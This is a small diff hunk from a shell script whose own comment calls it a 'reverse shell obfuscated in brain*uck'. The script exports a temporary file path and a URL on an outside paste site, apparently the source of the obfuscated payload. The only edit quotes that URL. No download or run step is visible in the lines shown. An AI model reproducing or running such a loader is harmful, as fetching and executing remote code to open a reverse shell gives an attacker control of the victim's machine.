@@ -2,7 +2,7 @@
 #reverse shell obfuscated in brain*uck
 
 export FILE="$TMPDIR/+++++"
-export BRAIN=https://paste.c-net.org/DisobeyPajama
+export BRAIN="https://paste.c-net.org/DisobeyPajama"
 
 cd $TMPDIR
 
